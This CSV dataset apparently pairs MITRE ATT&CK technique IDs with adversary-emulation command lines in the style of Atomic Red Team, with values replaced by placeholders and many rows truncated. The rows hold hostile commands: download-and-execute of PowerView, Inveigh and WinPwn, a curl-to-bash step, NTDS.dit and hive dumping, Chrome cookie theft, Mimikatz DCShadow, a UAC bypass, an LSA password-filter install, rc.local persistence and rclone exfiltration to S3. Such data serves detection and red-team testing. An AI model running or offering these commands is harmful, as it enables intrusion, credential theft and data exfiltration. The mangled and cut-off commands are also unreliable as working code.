mitre_id,command
T1197,bitsadmin.exe \transfer \download \priority foreground var_620
T1069,[net.servicepointmanager]::securityprotocol  =  [net.securityprotocoltype]::tls12  iex  (iwr  'https:\\raw.githubusercontent.com\powershellmafia\powersploit\master\recon\powerview.ps1'  -usebasicparsing);  get-domaingroup  -verbose
T1485,"if (-not (test-path ""var_128"""
T1222,takeown.exe /f #{file_folder_to_own} /r
T1046,nmap var_86150
T1218,invoke-athcompiledhelp -scriptengine #{script_engine} -infotechstoragehandler #{infotech_storage_handler} -topicextension #{topic_extension} -hhfilepath #{hh_file_path} -chmfilepath #{chm_file_path}
T1573,$server_ip = var_87726
T1059,"cmd /c ""for /l %x in (1,1,#{max_to_print}) do start wordpad.exe /p #{file_to_print}"" | out-null"
T1095,"cmd  \c  ""var_186"
T1001,"cd ""pathtoatomicsfolder\externalpayloads\"" import-module .\extract-invoke-psimage.ps1 $extractedscript=extract-invoke-psimage -image ""var_2044 $scriptpath = ""$home\textextraction.ps1"" $textmatches -join '' | set-content -path $scriptpath . ""$home\textextraction.ps1"""
T1555,"$passworddblocation = get-childitem -path ""$env:appdata\mozilla\firefox\profiles\*.default-release\"" cmd \c var_552"
T1025,"powershell.exe  -c  ""get-volume  |  where-object  {$_.drivetype  -eq  'removable'}  |  foreach-object  {  get-childitem  -path  ($_.driveletter  +  ':\*')  -recurse  -include  '*.doc*','*.xls*','*.txt','*.pdf'  -erroraction  silentlycontinue  |  foreach-object  {write-output  $_.fullname}  }  ;  if  (-not  (get-volume  |  where-object  {$_.drivetype  -eq  'removable'}))  {  write-output  'no  removable  media.'  }""; echo 40 > $null"
T1127,"copy ""var_723 \t:library %temp%\libhello.js"
T1548,sudo  -l  sudo  cat  \etc\sudoers  sudo  vim  \etc\sudoers
T1580,"export aws_region=#{aws_region} cd #{stratus_path} echo ""stratus: start warmup."" ./stratus warmup aws.discovery.ec2-enumerate-from-instance echo ""stratus: start detonate."" ./stratus detonate aws.discovery.ec2-enumerate-from-instance> /dev/null 2>&1 # id_21"
T1047,"wmic \node:""var_35462%%'"" call uninstall"
T1559,"""pathtoatomicsfolder\..\externalpayloads\build\namedpipes_executor.exe"" --pipe 1> /dev/null 2>&1 # id_10"
T1550,"var_693"""
T1518,"netsh.exe advfirewall show allprofiles netsh.exe advfirewall firewall dump netsh.exe advfirewall show currentprofile netsh.exe advfirewall firewall show rule name=all netsh.exe firewall show state netsh.exe firewall show config sc query windefend powershell.exe /c ""get-process | where-object { $_.processname -eq 'sysmon' }"" powershell.exe /c ""get-service | where-object {$_.displayname -like '*sysm*'}"" powershell.exe /c ""get-ciminstance win32_service -filter 'description = ''system monitor service'''"" tasklist.exe tasklist.exe | findstr /i virus tasklist.exe | findstr /i cb tasklist.exe | findstr /i defender tasklist.exe | findstr /i cylance tasklist.exe | findstr /i mc tasklist.exe | findstr /i ""virus cb defender cylance mc"""
T1557,"[net.servicepointmanager]::securityprotocol = [net.securityprotocoltype]::tls12 iex (iwr ""https:\\raw.githubusercontent.com\kevin-robertson\inveigh\82be2377ade47a4e325217b4144878a59595e750\inveigh.ps1"" -usebasicparsing) invoke-inveigh -consoleoutput y -nbns y -mdns y -https y -proxy y> /dev/null 2>&1 # id_64"
T1053,"""pathtoatomicsfolder\..\externalpayloads\psexec.exe""  \\var_675  logon"
T1005,"cd $home curl -o #{remote_url}/art curl -o #{remote_url}/gta.db curl -o #{remote_url}/sqlite_dump.sh chmod +x sqlite_dump.sh find . ! -executable -exec bash -c 'if [[ ""$(head -c 15 {} | strings)"" == ""sqlite format 3"" ]]; then echo ""{}""; ./sqlite_dump.sh {}; fi' \;# run_4460"
T1041,if(-not (test-path var_425 -method post -body $filecontent -disablekeepalive
T1652,"find \lib\modules\$(uname -r)\kernel\drivers -name ""*.ko*""# run_1307"
T1037,sudo  cp  var_7741  \tmp\t1037_005_agent.plist  \library\startupitems\atomic.sh  start
T1195,"kubectl run var_4284 --no-audit --no-fund --no-package-lock && echo '--- package.json after install ---' && cat package.json"""
T1124,w32tm  \stripchart  \computer:localhost  \period:5  \dataonly  \samples:2
T1202,"scriptrunner.exe -appvscript ""var_766"""
T1612,docker build -t t1612 $pathtoatomicsfolder/t1612/src/ docker run --name t1612_container --rm -d -t t1612 docker exec t1612_container ./test.sh# run_4602
T1137,reg.exe add hkcu\software\microsoft\office\var_12884 \f
T1010,c:\windows\microsoft.net\framework\v4.0.30319\csc.exe -out:var_678
T1106,"c:\windows\microsoft.net\framework\v4.0.32549\csc.exe \out:""var_37710"" %tmp%\t1106.exe"
T1539,"killall 'google chrome' sleep 1 open -a ""\applications\google chrome.app\contents\macos\google chrome"" --args --remote-debugging-port=49070 --remote-allow-origins=http:\\localhost\ sleep 1 \tmp\whitechocolatemacademianut\chocolate -d cookies -p 46209"
T1216,"cscript.exe \b %systemroot%\system32\printing_admin_scripts\en-us\pubprn.vbs localhost ""script:var_856"""
T1556,"reg.exe  export  hklm\system\currentcontrolset\control\lsa\  ""pathtoatomicsfolder\t1556.002\lsa_backup.reg""  $passwordfiltername  =  (copy-item  ""var_355""  -destination  ""%systemroot%\system32""  -passthru).basename  $lsakey  =  get-item  ""hklm:\system\currentcontrolset\control\lsa\""  $authenticationpackagesvalues  =  $lsakey.getvalue(""authentication  packages"")  $authenticationpackagesvalues  +=  $passwordfiltername  set-itemproperty  ""hklm:\system\currentcontrolset\control\lsa\""  ""authentication  packages""  $authenticationpackagesvalues"
T1129,"var_174"""
T1059,"[ ""$(uname)"" = 'freebsd' ] && encodecmd=""b64encode -r -"" && decodecmd=""b64decode -r"" || encodecmd=""base64 -w 0"" && decodecmd=""base64 -d"" art=$(echo -n ""id"" | $encodecmd) echo ""\$art=$art"" echo -n ""$art"" | $decodecmd |/bin/bash unset art# run_7082"
T1548,iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/s3cur3th1ssh1t/creds/master/obfuscatedps/dccuac.ps1')
T1482,"""var_661"
T1070,sudo shred -u -z -n 3 #{system_log_path}
T1083,dir \s c:\ >> var_79067
T1622,"# check for common debugger processes $debuggerprocesses = get-process | where-object { $_.processname -match ""dbg"" -or $_.processname -match ""debug"" } # check for debugging flags $debuggingflags = [system.diagnostics.debugger]::isattached> /dev/null 2>&1 # id_17"
T1217,"find  \  -path  ""*\google\chrome\*\bookmarks""  -exec  echo  {}  >>  var_51394  2>\dev\null"
T1566,"# add user32.dll for keybd_event add-type @"" using system; using system.runtime.interopservices; public class k { [dllimport(""user32.dll"")] public static extern void keybd_event(byte bvk, byte bscan, uint dwflags, uintptr dwextrainfo); } ""@ # virtual key codes $vk_lwin, $vk_r, $keydown, $keyup = 0x5b, 0x52, 0x0000, 0x0002 # open run dialog (win+r) [k]::keybd_event($vk_lwin, 0, $keydown, [uintptr]::zero) [k]::keybd_event($vk_r, 0, $keydown, [uintptr]::zero) [k]::keybd_event($vk_r, 0, $keyup, [uintptr]::zero) [k]::keybd_event($vk_lwin, 0, $keyup, [uintptr]::zero) # short delay for run dialog start-sleep -milliseconds 500 add-type -assemblyname system.windows.forms [system.windows.forms.sendkeys]::sendwait(""cmd \c powershell -ec "" + [convert]::tobase64string([system.text.encoding]::unicode.getbytes('var_708"")"
T1222,"reg add ""hklm\system\currentcontrolset\control\filesystem"" /v symlinkremotetolocalevaluation /t reg_dword /d ""1"" /f reg add ""hklm\system\currentcontrolset\control\filesystem"" /v symlinkremotetoremoteevaluation /t reg_dword /d ""1"" /f"
T1570,new-smbmapping -remotepath 'var_737' 'z:\'
T1547,"$oldvalue = $(get-itempropertyvalue -path ""hklm:\software\microsoft\windows nt\currentversion\winlogon"" -name ""shell""); set-itemproperty -path ""hklm:\software\microsoft\windows nt\currentversion\winlogon"" -name ""shell-backup"" -value ""$oldvalue""; $newvalue = $oldvalue + "", var_414""; set-itemproperty -path ""hklm:\software\microsoft\windows nt\currentversion\winlogon"" -name ""shell"" -value ""$newvalue"""
T1091,"$removabledrives=@()  $removabledrives  =  get-wmiobject  -class  win32_logicaldisk  -filter  ""drivetype=2""  |  select-object  -expandproperty  deviceid  foreach  ($drive  in  $removabledrives)  {  write-host  ""removable  drive  found:""  $drive  new-item  -path  $drive\t1091test1.txt  -itemtype  ""file""  -force  -value  ""t1091  test  1  has  created  this  file  to  simulate  malware  spread  to  removable  drives.""  }# run_2374"
T1567,"write-host  ""deploying  aws  infrastructure...  ""  -nonewline  $awsaccesskey  =  ""var_775  ""@  $config  |  out-file  -filepath  ""pathtoatomicsfolder\..\externalpayloads\t1567.002\rclone.conf""  -encoding  ascii  write-host  ""done!""  write-host  ""exfiltrating  data...  ""  -nonewline  $bucket  =  ""$(pathtoatomicsfolder\..\externalpayloads\t1567.002\terraform-v*\terraform  output  bucket)"".replace(""`"""","""")  cd  pathtoatomicsfolder\..\externalpayloads\t1567.002\rclone-v*  $null  =  .\rclone  copy  --max-size  1700k  ""pathtoatomicsfolder\..\externalpayloads\t1567.002\data\""  exfils3:$bucket  --config  ""pathtoatomicsfolder\..\externalpayloads\t1567.002\rclone.conf""  write-host  ""done!"""
T1110,useradd  -g  wheel  -s  \bin\bash  -p  $(openssl  passwd  -1  password123)  art  su  art  cd  \tmp  curl  -s  var_333  |bash
T1526,"import-module ""pathtoatomicsfolder\t1526\src\awsdiscovery.ps1"" $access_key = ""var_374"""
T1573,$server_ip = var_295
T1526,"import-module ""pathtoatomicsfolder\t1526\src\azurediscovery.ps1"" $client_id = ""var_663"""
T1087,"& ""pathtoatomicsfolder\..\externalpayloads\adfind.exe"" var_56341 -s subtree -f ""objectclass=computer"" *"
T1119,mkdir  %temp%\t1119_command_prompt_collection  >nul  2>&1  dir  c:  \b  \s  .docx  |  findstr  \e  .docx  for  \r  c:\  %f  in  (*.docx)  do  copy  \y  %f  %temp%\t1119_command_prompt_collection# run_5459
T1528,"az login # log in to azure cli $allowsharedkeyaccess = az storage account show --name ""var_197"
T1531,"connect-azuread $userprincipalname = ""var_72900"" remove-azureaduser -objectid $userprincipalname"
T1615,gpresult \z
T1620,iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/s3cur3th1ssh1t/winpwn/121dcee26a7aca368821563cbe92b2b5638c5773/winpwn.ps1') mimiload -consoleoutput -noninteractive> /dev/null 2>&1 # id_31
T1550,var_537
T1556,"sudo sed -i ""var_638"
T1027,"$originalcommand  =  'var_1673)))"""
T1018,arp -a | grep -v '^?'> /dev/null 2>&1 # id_90
T1132,"$plaintext = ([system.text.encoding]::utf8.getbytes(""var_391 -method post -body $cyphertext -disablekeepalive"
T1056,swift var_51092 -keylog
T1654,powershell -c {get-eventlog 'security' | where {$_.message -like '*system*'} | export-csv $env:temp\t1654_events.txt}; echo 60 > $null
T1530,"$storage_account_objects = import-csv -path ""var_190"
T1489,sudo kill -sigterm $(pgrep var_43299)
T1559,"""pathtoatomicsfolder\..\externalpayloads\build\namedpipes_executor.exe""  --pipe  5"
T1612,docker build -t t1612 $pathtoatomicsfolder\t1612\src\ docker run --name t1612_container --rm -d -t t1612 docker exec t1612_container .\test.sh> /dev/null 2>&1 # id_33
T1482,"""var_27187"
T1614,curl -k var_89848
T1120,iex(new-object  net.webclient).downloadstring('https:\\raw.githubusercontent.com\s3cur3th1ssh1t\winpwn\121dcee26a7aca368821563cbe92b2b5638c5773\winpwn.ps1')  printercheck  -noninteractive  -consoleoutput
T1529,shutdown -r var_994
T1620,iex(new-object  net.webclient).downloadstring('https:\\raw.githubusercontent.com\s3cur3th1ssh1t\winpwn\121dcee26a7aca368821563cbe92b2b5638c5773\winpwn.ps1')  mimiload  -consoleoutput  -noninteractive# run_3553
T1120,iex(new-object  net.webclient).downloadstring('https:\\raw.githubusercontent.com\s3cur3th1ssh1t\winpwn\121dcee26a7aca368821563cbe92b2b5638c5773\winpwn.ps1')  printercheck  -noninteractive  -consoleoutput> /dev/null 2>&1 # id_20
T1127,"copy  ""var_951  \t:library  %temp%\libhello.js"
T1580,aws ec2 describe-security-groups --profile var_239
T1001,"get-content ""var_46991"" -encoding byte"
T1018,"ip tcp_metrics show |grep --invert-match ""^127\.""> /dev/null 2>&1 # id_67"
T1566,"#  add  user32.dll  for  keybd_event  add-type  @""  using  system;  using  system.runtime.interopservices;  public  class  k  {  [dllimport(""user32.dll"")]  public  static  extern  void  keybd_event(byte  bvk,  byte  bscan,  uint  dwflags,  uintptr  dwextrainfo);  }  ""@  #  virtual  key  codes  $vk_lwin,  $vk_r,  $keydown,  $keyup  =  0x5b,  0x52,  0x0000,  0x0002  #  open  run  dialog  (win+r)  [k]::keybd_event($vk_lwin,  0,  $keydown,  [uintptr]::zero)  [k]::keybd_event($vk_r,  0,  $keydown,  [uintptr]::zero)  [k]::keybd_event($vk_r,  0,  $keyup,  [uintptr]::zero)  [k]::keybd_event($vk_lwin,  0,  $keyup,  [uintptr]::zero)  #  short  delay  for  run  dialog  start-sleep  -milliseconds  500  add-type  -assemblyname  system.windows.forms  [system.windows.forms.sendkeys]::sendwait(""cmd  \c  powershell  -ec  ""  +  [convert]::tobase64string([system.text.encoding]::unicode.getbytes('var_586"")"
T1124,net time \\var_1356 w32tm \tz
T1526,"import-module ""pathtoatomicsfolder\t1526\src\awsdiscovery.ps1"" $access_key = ""var_21180"""
T1010,c:\windows\microsoft.net\framework\v4.0.53011\csc.exe -out:var_33477
T1613,docker  build  -t  t1613  $pathtoatomicsfolder\t1613\src\  docker  run  --name  t1613_container  --rm  -d  -t  t1613  docker  ps  docker  stats  --no-stream  docker  inspect  $(docker  ps  -l  -q  --filter  ancestor=t1613)# run_1425
T1497,"if  [  ""$(csrutil  status  |  grep  -v  'enabled')""  !=  """"  ];  then  echo  'possible  virtualization  environment  detected';  fi;# run_5779"
T1651,"import-module ""pathtoatomicsfolder\t1651\src\t1651-1\awsssmattack.ps1"" -force $access_key = ""var_806"" set-awsauthentication -accesskey $access_key -secretkey $secret_key -sessiontoken $session_token -awsprofile $aws_profile -awsregion $region invoke-terraform -terraformcommand init -terraformdirectory ""pathtoatomicsfolder\t1651\src\t1651-1"" invoke-terraform -terraformcommand apply -terraformdirectory ""pathtoatomicsfolder\t1651\src\t1651-1"" -terraformvariables @(""profile=t1651-1"", ""region=$region"") invoke-ssmattack -awsprofile ""t1651-1"" -terraformdirectory ""pathtoatomicsfolder\t1651\src\t1651-1"" invoke-terraform -terraformcommand destroy -terraformdirectory ""pathtoatomicsfolder\t1651\src\t1651-1"" -terraformvariables @(""profile=t1651-1"", ""region=$region"")"
T1613,podman build -t t1613 $pathtoatomicsfolder\t1613\src\ podman run --name t1613_container --rm -d -t t1613 podman ps podman stats --no-stream podman inspect $(podman ps -l -q --filter ancestor=t1613)
T1136,iex(new-object net.webclient).downloadstring('https:\\raw.githubusercontent.com\0xv1n\dotnetfun\9b3b0d11d1c156909c0b1823cff3004f80b89b1f\persistence\createnewlocaladmin_art.ps1')
T1027,g++ var_605 && .\a.out
T1610,docker build -t t1610 $pathtoatomicsfolder\t1610\src\ docker run --name t1610_container --rm -itd t1610 bash \tmp\script.sh> /dev/null 2>&1 # id_13
T1135,"import-module ""pathtoatomicsfolder\..\externalpayloads\powerview.ps1"" invoke-sharefinder var_52521"
T1123,sh var_51954
T1559,"""pathtoatomicsfolder\..\externalpayloads\build\namedpipes_executor.exe""  --pipe  3"
T1558,"remove-item $env:temp\silver.bat -erroraction ignore remove-item $env:temp\silver.txt -erroraction ignore # get current domain sid if default was used $domain_sid = ""var_668 while ($false) # dummy loop so that 'break' can be used # show output from new empty session get-content $env:temp\silver.txt # cleanup temp files remove-item $env:temp\silver.bat -erroraction ignore remove-item $env:temp\silver.txt -erroraction ignore"
T1221,"start ""var_871"""
T1078,"useradd  --shell  \bin\bash  --create-home  --password  $(openssl  passwd  -1  art)  art  usermod  --lock  art  usermod  --expiredate  ""1""  art  usermod  --unlock  art  usermod  --expiredate  ""47164""  art  su  -c  whoami  art"
T1132,echo -n 111-11-1111 | b64encode -r - curl -xpost var_943
T1204,"$url = ""var_661"" invoke-webrequest -uri $url -outfile $outfile -usebasicparsing $process = start-process -filepath $outfile -passthru -windowstyle normal $process.id | out-file ""$env:temp\click-fix-pid.txt"""
T1082,"powershell.exe -c ""get-culture | format-list | out-file -filepath %tmp%\a.txt""> /dev/null 2>&1 # id_26"
T1012,"new-psdrive -psprovider registry -root hkey_classes_root -name hkcr get-childitem -path hkcr:\clsid -name | select -skip 1 > $env:temp\clsids.txt foreach($clsid in get-content ""$env:temp\clsids.txt"") {try{write-output ""$($position)-$($clsid)"" write-output ""------------""| out-file var_56243"
T1005,"$startingdirectory = ""#{starting_directory}"" $outputzip = ""#{output_zip_folder_path}"" $fileextensionsstring = ""#{file_extensions}"" $fileextensions = $fileextensionsstring -split "", "" new-item -type directory $outputzip -erroraction ignore -force | out-null function search-files { param ( [string]$directory ) $files = get-childitem -path $directory -file -recurse | where-object { $fileextensions -contains $_.extension.tolower() } return $files } $foundfiles = search-files -directory $startingdirectory if ($foundfiles.count -gt 0) { $foundfilepaths = $foundfiles.fullname compress-archive -path $foundfilepaths -destinationpath ""$outputzip\data.zip"" write-host ""zip file created: $outputzip\data.zip"" } else { write-host ""no files found with the specified extensions."" }"
T1105,sftp #{username}@#{remote_host}:#{remote_file} #{local_path}
T1127,"copy ""var_499 %temp%\hello.js"
T1529,"echo """" | ""var_621'`; do vim-cmd vmsvc\power.off $i & done"""
T1007,net.exe  start  >>  var_73949
T1040,sudo  var_32574  -t  3
T1027,"if [ ""$(uname)"" = 'freebsd' ]; then cmd=""b64decode -r""; else cmd=""base64 -d""; fi; cat \tmp\encoded.dat | $cmd > \tmp\art.sh chmod +x \tmp\art.sh \tmp\art.sh> /dev/null 2>&1 # id_66"
T1049,sockstat -4 sockstat -6 2>/dev/null || true sockstat -l 2>/dev/null || true
T1037,sudo cp var_60506 \tmp\t1037_005_agent.plist \library\startupitems\atomic.sh start
T1612,docker build -t t1612 $pathtoatomicsfolder/t1612/src/ docker run --name t1612_container --rm -d -t t1612 docker exec t1612_container ./test.sh> /dev/null 2>&1 # id_43
T1010,c:\windows\microsoft.net\framework\v4.0.47503\csc.exe  -out:var_87101
T1025,"powershell.exe -c ""get-volume | where-object {$_.drivetype -eq 'removable'} | foreach-object { get-childitem -path ($_.driveletter + ':\*') -recurse -include '*.doc*','*.xls*','*.txt','*.pdf' -erroraction silentlycontinue | foreach-object {write-output $_.fullname} } ; if (-not (get-volume | where-object {$_.drivetype -eq 'removable'})) { write-output 'no removable media.' }""; echo 21 > $null"
T1606,"import-module aadinternals -force $saml = new-aadintsamltoken -immutableid ""var_358 write-host ""end of golden saml"""
T1553,regsvr32.exe var_11242
T1539,"stop-process -name ""chrome"" -force -erroraction silentlycontinue ""select host_key, name, encrypted_value, path, expires_utc, is_secure, is_httponly from [cookies];"" | cmd \c var_350"""
T1528,"az  login  #  log  in  to  azure  cli  $allowsharedkeyaccess  =  az  storage  account  show  --name  ""var_121"
T1546,echo '#{text_to_append}' >> /etc/profile# run_2862
T1531,sysadminctl -deleteuser var_475 #enter admin password
T1049,$syntaxlist  =  var_743
T1542,"echo ""creating %systemroot%\wpbbin.exe"" new-item -itemtype file -path ""$env:systemroot\system32\wpbbin.exe""# run_4869"
T1547,"copy-item ""$pathtoatomicsfolder\t1547.001\src\vbsstartup.vbs"" ""$env:appdata\microsoft\windows\start menu\programs\startup\vbsstartup.vbs"" copy-item ""$pathtoatomicsfolder\t1547.001\src\vbsstartup.vbs"" ""c:\programdata\microsoft\windows\start menu\programs\startup\vbsstartup.vbs"" cscript.exe ""$env:appdata\microsoft\windows\start menu\programs\startup\vbsstartup.vbs"" cscript.exe ""c:\programdata\microsoft\windows\start menu\programs\startup\vbsstartup.vbs""# run_1727"
T1115,"[net.servicepointmanager]::securityprotocol = [net.securityprotocoltype]::tls12 set-clipboard -value ""atomic t1115 test, grab data from clipboard via vba"" iex (iwr ""https:\\raw.githubusercontent.com\redcanaryco\atomic-red-team\master\atomics\t1204.002\src\invoke-maldoc.ps1"" -usebasicparsing) invoke-maldoc -macrofile ""pathtoatomicsfolder\t1115\src\t1115-macrocode.txt"" -officeproduct ""word"" -sub ""getclipboard""# run_7249"
T1090,export var_99356
T1129,"var_802"""
T1569,launchctl submit -l var_202
T1610,docker  build  -t  t1610  $pathtoatomicsfolder\t1610\src\  docker  run  --name  t1610_container  --rm  -itd  t1610  bash  \tmp\script.sh> /dev/null 2>&1 # id_43
T1648,"import-module ""pathtoatomicsfolder\t1648\src\t1648-1\lambdaattack.ps1"" -force $access_key = ""var_636"" set-awsauthentication -accesskey $access_key -secretkey $secret_key -sessiontoken $session_token -awsprofile $aws_profile -awsregion $region invoke-terraform -terraformcommand init -terraformdirectory ""pathtoatomicsfolder\t1648\src\t1648-1"" invoke-terraform -terraformcommand apply -terraformdirectory ""pathtoatomicsfolder\t1648\src\t1648-1"" -terraformvariables @(""profile=t1648-1"", ""region=$region"") invoke-lambdaattack -awsprofile ""t1648-1"" -awsregion $region"
T1082,lsmod kmod list grep vmw /proc/modules
T1548,"reg.exe add hkcu\software\classes\ms-settings\shell\open\command \ve \d ""var_51217"" \f reg.exe add hkcu\software\classes\ms-settings\shell\open\command \v ""delegateexecute"" \f fodhelper.exe"
T1003,copy #{vsc_name}\windows\ntds\ntds.dit #{extract_path}\ntds.dit copy #{vsc_name}\windows\system32\config\system #{extract_path}\vsc_system_hive reg save hklm\system #{extract_path}\system_hive
T1207,"# starting fake dc server, as system (required) $dc_output_file = ""pathtoatomicsfolder\..\externalpayloads\art-t1207-mimikatz-dc.log"" remove-item $dc_output_file -erroraction ignore $mimikatzparam =""`""log $dc_output_file`"" `""lsadump::dcshadow \object:var_77011"" ""lsadump::dcshadow \push"" ""exit"" write-host ""`nwaiting for fake dc server to return"" wait-process $dc write-host ""`noutput from fake dc server:"" get-content $dc_output_file start-sleep 1 # wait a little until the file is not locked anymore so we can actually delete it remove-item $dc_output_file -erroraction ignore write-host ""end of dcshadow"""
T1651,"import-module  ""pathtoatomicsfolder\t1651\src\t1651-1\awsssmattack.ps1""  -force  $access_key  =  ""var_26485""  set-awsauthentication  -accesskey  $access_key  -secretkey  $secret_key  -sessiontoken  $session_token  -awsprofile  $aws_profile  -awsregion  $region  invoke-terraform  -terraformcommand  init  -terraformdirectory  ""pathtoatomicsfolder\t1651\src\t1651-1""  invoke-terraform  -terraformcommand  apply  -terraformdirectory  ""pathtoatomicsfolder\t1651\src\t1651-1""  -terraformvariables  @(""profile=t1651-1"",  ""region=$region"")  invoke-ssmattack  -awsprofile  ""t1651-1""  -terraformdirectory  ""pathtoatomicsfolder\t1651\src\t1651-1""  invoke-terraform  -terraformcommand  destroy  -terraformdirectory  ""pathtoatomicsfolder\t1651\src\t1651-1""  -terraformvariables  @(""profile=t1651-1"",  ""region=$region"")"
T1485,"if  (-not  (test-path  ""var_585"""
T1195,"kubectl run var_75376 --no-audit --no-fund --no-package-lock && echo '--- package.json after install ---' && cat package.json"""
T1095,"cmd \c ""var_308"
T1557,"[net.servicepointmanager]::securityprotocol  =  [net.securityprotocoltype]::tls12  iex  (iwr  ""https:\\raw.githubusercontent.com\kevin-robertson\inveigh\82be2377ade47a4e325217b4144878a59595e750\inveigh.ps1""  -usebasicparsing)  invoke-inveigh  -consoleoutput  y  -nbns  y  -mdns  y  -https  y  -proxy  y# run_3585"
T1132,"$plaintext = ([system.text.encoding]::utf8.getbytes(""var_21729 -method post -body $cyphertext -disablekeepalive"
T1040,sudo #{program_path} -f -i #{ifname} -t 3
T1570,net use * 'var_799' '*:\'
T1037,"filename='\etc\rc.local';if [ ! -f $filename ];then sudo touch $filename;else sudo cp $filename \etc\rc.local.original;fi [ ""$(uname)"" = 'freebsd' ] && alias python3=python3.9 && printf '#\!\usr\local\bin\bash' | sudo tee \etc\rc.local || printf '#!\bin\bash' | sudo tee \etc\rc.local echo ""\npython3 -c \""import os, base64;exec(base64.b64decode('aw1wb3j0ig9zcm9zlnbvcgvukcdly2hvigf0b21pyyb0zxn0igzvcibtb2rpznlpbmcgcmmubg9jywwgpiavdg1wl1qxmdm3ljawnc5yyy5sb2nhbccpcgo='))\"""" | sudo tee -a \etc\rc.local printf 'exit 0' | sudo tee -a \etc\rc.local sudo chmod +x \etc\rc.local# run_8509"
T1114,"powershell -executionpolicy bypass -command ""var_172"
T1219,"start-process ""#{remotepc_path}""> /dev/null 2>&1 # id_14"
T1571,test-netconnection -computername var_43299
T1119,mkdir  %temp%\t1119_command_prompt_collection  >nul  2>&1  dir  c:  \b  \s  .docx  |  findstr  \e  .docx  for  \r  c:\  %f  in  (*.docx)  do  copy  \y  %f  %temp%\t1119_command_prompt_collection# run_7056
T1592,"get-ciminstance -query ""select * from win32_pnpentity where (pnpclass = 'image' or pnpclass = 'camera')""# run_1099"
T1573,$server_ip = var_266
T1546,"reg add ""hklm\software\microsoft\terminal server client"" /v clxdllpath /t reg_sz /d ""#{dll_inf}"" /f"
T1072,"""%programfiles(x86)%\var_750"""
T1041,"$dnsserver  =  ""var_461"
